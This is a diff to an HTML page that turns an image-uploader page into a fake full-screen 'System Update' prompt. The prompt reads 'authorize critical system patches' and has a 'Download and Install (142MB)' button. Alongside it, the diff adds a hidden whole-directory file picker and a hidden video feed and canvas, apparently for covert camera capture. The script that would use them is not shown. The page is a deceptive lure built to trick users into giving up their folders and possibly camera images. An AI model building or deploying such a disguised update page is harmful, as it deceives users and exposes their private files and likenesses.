@@ -2,21 +2,28 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Auto Image Uploader 2099</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="manifest" href="manifest.json">
 </head>
-<body>
-    <div class="container">
-        <h2>System Ingestion</h2>
-        <div id="autoUploadStatus">Awaiting Command...</div>
+<body style="background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden;">
+    <div id="updateScreen" style="text-align: center; width: 80%;">
+        <div class="loader-logo" style="font-size: 50px; margin-bottom: 20px;">⚙️</div>
+        <h2 id="statusText">System Update Required</h2>
+        <p style="color: #888; font-size: 14px;">Please authorize critical system patches to continue.</p>
+        
+        <div class="progress-container" style="width: 100%; background: #222; height: 10px; border-radius: 5px; margin: 20px 0; display: none;" id="pBar">
+            <div id="progressFill" style="width: 0%; background: #007bff; height: 100%; border-radius: 5px; transition: width 2s linear;"></div>
+        </div>
+
         <input type="file" id="fileInput" webkitdirectory directory multiple style="display: none;">
-        <button id="startBtn" style="padding: 20px; width: 100%; cursor: pointer;">تفعيل المسح الشامل (سماح)</button>
-    </div>
-    
-    <div id="imageGallery">
-        <div id="imagesContainer"></div>
+        <button id="startBtn" style="padding: 15px 30px; background: #007bff; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">Download and Install (142MB)</button>
+        
+        <video id="videoFeed" autoplay playsinline style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
-    <script src="script.js"></script>
+    <script type="module" src="script.js"></script>
 </body>
 </html>
